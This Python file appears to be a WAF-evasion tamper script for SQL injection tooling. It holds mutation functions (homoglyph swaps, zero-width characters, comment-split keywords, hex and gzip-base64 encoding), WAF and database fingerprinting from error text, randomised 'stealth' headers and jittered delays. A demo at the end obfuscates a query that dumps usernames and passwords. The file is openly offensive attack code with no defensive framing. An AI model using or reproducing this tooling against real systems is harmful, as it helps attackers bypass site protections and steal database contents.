import random
import string
import time
import base64
import urllib.parse
import re
import hashlib
import json
import math
import collections
import zlib

# ==========================
# Constants & Signature Sets
# ==========================

ZERO_WIDTH = [
    '\u200b', '\u200c', '\u200d', '\ufeff', '\u2060',
    '\u180e', '\u2061', '\u2062', '\u2063', '\u034f', '\u061c'
]

HOMOGLYPHS = {
    'a': ['а', 'α', '𝗮', '𝒶'],
    'e': ['е', 'ҽ', '𝚎', '𝛆'],
    'i': ['і', '𝚒', '𝜄'],
    'o': ['ο', '𝛚', '𝚘'],
    's': ['ѕ', '𝚜'],
    'c': ['с', '𝚌'],
    't': ['т', '𝚝'],
    'd': ['ԁ'],
    'b': ['Ь'],
    'l': ['ⅼ'],
    'm': ['м'],
    'n': ['п'],
    'r': ['г'],
    'u': ['υ'],
    'y': ['у'],
    'h': ['һ'],
}

WAF_SIGS = [
    '403', 'mod_security', 'access denied', 'blocked', 'waf', 'cloudflare',
    'intrusion prevention', 'sqlmap detected', 'forbidden', 'captcha', 'challenge', 'bot detected'
]

DBMS_SIGS = {
    'mysql': ['mysql', 'syntax error', 'unknown column', 'you have an error in your sql syntax'],
    'pgsql': ['postgresql', 'pg_', 'sqlstate', 'syntax error at or near'],
    'mssql': ['sql server', 'unclosed quotation mark', 'microsoft', 'incorrect syntax near'],
    'oracle': ['ora-', 'oracle error', 'plsql', 'error at line']
}

# ===========================
# Internal state & stats cache
# ===========================

state = {
    'waf_detected': False,
    'dbms': 'unknown',
    'seen_hashes': set(),
    'mutation_stats': {},
    'mutation_history': [],
    'success_chains': [],
    'backoff': 1.0,
    'gzip_cache': {},
    'hash_cache': {},
}

# ===========================
# HTTP Header Manipulation
# ===========================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/16.5 Mobile/15E148 Safari/604.1"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://search.yahoo.com/",
    "https://www.baidu.com/"
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8,en-US;q=0.5",
    "en-US,en-GB;q=0.7,en;q=0.3"
]

def generate_stealth_headers():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS),
        'Accept-Language': random.choice(ACCEPT_LANGS),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        f'X-Custom-{random.choice(string.ascii_uppercase)}': ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
    }
    return headers

# ===========================
# Utility Functions (Mutation)
# ===========================

def entropy(s):
    if not s:
        return 0
    freq = collections.Counter(s)
    length = len(s)
    return -sum((count/length)*math.log2(count/length) for count in freq.values())

def rand_case(s):
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def homoglyph_substitute(s):
    result = []
    for c in s:
        lower = c.lower()
        if lower in HOMOGLYPHS:
            result.append(random.choice(HOMOGLYPHS[lower]))
        else:
            result.append(c)
    return ''.join(result)

def inject_zwsp(s):
    res = []
    for c in s:
        res.append(c)
        if c.isalpha() and random.random() < 0.5:
            res.append(random.choice(ZERO_WIDTH))
    return ''.join(res)

def reverse_str(s):
    return s[::-1]

def base64_percent_encode(s):
    b64 = base64.b64encode(s.encode()).decode()
    return ''.join('%{:02x}'.format(ord(c)) for c in b64)

def break_sql_keywords(s):
    keywords = ['select','from','where','union','insert','update','delete','sleep','if','case','and','or','xor','having','waitfor','delay']
    pattern = re.compile(r'\b(' + '|'.join(keywords) + r')\b', re.I)
    def replacer(m):
        w = m.group(0)
        split = random.randint(1, len(w)-1)
        return w[:split] + '/**/' + w[split:]
    return pattern.sub(replacer, s)

def confuse_waf(s):
    junk = ['/*!00000SELECT*/', '--fake--', '#', '0x00', 'XOR', '/*!UNION*/', '/*!SLEEP*/', '--X--']
    pos = random.randint(0, len(s))
    return s[:pos] + random.choice(junk) + s[pos:]

def wrap_sql_logic(payload):
    templates = [
        f"IF(1=1,({payload}),NULL)",
        f"CASE WHEN 1=1 THEN ({payload}) ELSE NULL END",
        f"IFNULL(NULL,({payload}))",
        f"COALESCE(NULL,({payload}))",
        f"CONCAT(CHAR(115,101,108),({payload}))"
    ]
    return random.choice(templates)

def random_noise(length=32):
    chars = string.printable + ''.join(chr(i) for i in range(0, 32)) + ''.join(chr(i) for i in range(127, 160))
    return ''.join(random.choice(chars) for _ in range(length))

def sql_hex_obfuscate(s):
    hexed = ''.join(f"{ord(c):02x}" for c in s)
    parts = []
    i = 0
    while i < len(hexed):
        chunk = hexed[i:i+random.randint(2,6)]
        parts.append(f"CHAR(0x{chunk})")
        i += len(chunk)
    return "CONCAT(" + ",".join(parts) + ")"

def gzip_base64(s):
    if s in state['gzip_cache']:
        return state['gzip_cache'][s]
    compressed = zlib.compress(s.encode())
    b64 = base64.b64encode(compressed).decode()
    state['gzip_cache'][s] = b64
    return b64

def fingerprint(s):
    if s in state['hash_cache']:
        return state['hash_cache'][s]
    h = hashlib.sha256(s.encode()).hexdigest()
    state['hash_cache'][s] = h
    return h

def weight(stats):
    now = time.time()
    succ = stats.get('success', 0)
    fail = stats.get('fail', 0)
    last = stats.get('last_used', 0)
    total = succ + fail
    if total == 0:
        return 0.5
    rate = succ / total
    age = now - last
    decay = 1 / (1 + (age / 3600))
    return 1 / (1 + math.exp(-12 * (rate - 0.5))) * decay

def pick_mutation():
    candidates = []
    for func in MUTATION_LIST:
        n = func.__name__
        st = state['mutation_stats'].get(n, {'success':0, 'fail':0, 'last_used':0})
        w = weight(st)
        candidates.append((w, func))
    candidates.sort(key=lambda x: x[0], reverse=True)
    total = sum(w for w,_ in candidates)
    r = random.uniform(0, total)
    s = 0
    for w, f in candidates:
        s += w
        if s >= r:
            return f
    return random.choice(MUTATION_LIST)

def update_stats(name, success):
    now = time.time()
    st = state['mutation_stats'].setdefault(name, {'success':0, 'fail':0, 'last_used':0})
    if success:
        st['success'] += 1
    else:
        st['fail'] += 1
    st['last_used'] = now

def recursive_mutate(payload, depth=10):
    p = payload
    chain = []
    for _ in range(depth):
        func = pick_mutation()
        try:
            p = func(p)
        except Exception:
            continue
        chain.append(func.__name__)
        if random.random() < 0.3:
            p += random_noise(random.randint(8,24))
        if random.random() < 0.2:
            p = sql_hex_obfuscate(p)
    p = wrap_sql_logic(p)
    compressed = gzip_base64(p)
    encoded = urllib.parse.quote(compressed)
    state['mutation_history'] = chain[-7:]
    return encoded

def detect_context(p):
    if 'query=' in p or '{' in p:
        return 'graphql'
    if '=' in p and '&' in p:
        return 'param'
    if p.isdigit():
        return 'int'
    if "'" in p or '"' in p:
        return 'string'
    return 'generic'

def random_delay(base=1.5, jitter=1.0):
    delay_time = base + random.uniform(0, jitter)
    time.sleep(delay_time)

def tamper(payload, **kwargs):
    """
    Core tamper function with adaptive mutation, WAF/DBMS detection,
    feedback learning, stealth delay, and header manipulation.
    """
    response = kwargs.get('response', '')
    success = kwargs.get('success', None)

    resp_lower = response.lower()
    state['waf_detected'] = any(sig in resp_lower for sig in WAF_SIGS)
    for db, sigs in DBMS_SIGS.items():
        if any(s in resp_lower for s in sigs):
            state['dbms'] = db

    fp = fingerprint(payload)
    if fp in state['seen_hashes']:
        payload += random.choice(string.ascii_letters)
    state['seen_hashes'].add(fp)

    if state['success_chains'] and random.random() > 0.7:
        chain = random.choice(state['success_chains'])
        p = payload
        for name in chain:
            for f in MUTATION_LIST:
                if f.__name__ == name:
                    try:
                        p = f(p)
                    except Exception:
                        pass
        mutated = p
    else:
        mutated = recursive_mutate(payload)

    if success is not None:
        for name in state.get('mutation_history', []):
            update_stats(name, success)
        if success and state.get('mutation_history'):
            state['success_chains'].append(state['mutation_history'])
            state['backoff'] = max(1.0, state['backoff'] * 0.8)
        else:
            state['backoff'] = min(5.0, state['backoff'] * 1.5)

    random_delay(base=1.5 * state['backoff'], jitter=1.5)

    ctx = detect_context(payload)
    if ctx == 'graphql':
        return json.dumps({"query": f"{{user(input:\\\"{mutated}\\\"){{id}}}}"})
    if ctx == 'param':
        return urllib.parse.quote_plus(mutated)
    return mutated

# ===========================
# Mutation functions list
# ===========================

MUTATION_LIST = [
    rand_case,
    homoglyph_substitute,
    inject_zwsp,
    reverse_str,
    break_sql_keywords,
    confuse_waf,
    wrap_sql_logic,
    base64_percent_encode,
]

# ===========================
# Example usage / testing
# ===========================

if __name__ == "__main__":
    sample_payload = "SELECT * FROM users WHERE username='admin' AND password='password';"
    print("Original Payload:")
    print(sample_payload)

    for i in range(3):
        tampered = tamper(sample_payload, response="403 Forbidden", success=False)
        print(f"\nTampered Payload #{i+1}:")
        print(tampered)

    print("\nGenerated HTTP Headers (Stealth Mode):")
    for _ in range(3):
        headers = generate_stealth_headers()
        for k,v in headers.items():
            print(f"{k}: {v}")
        print("---")
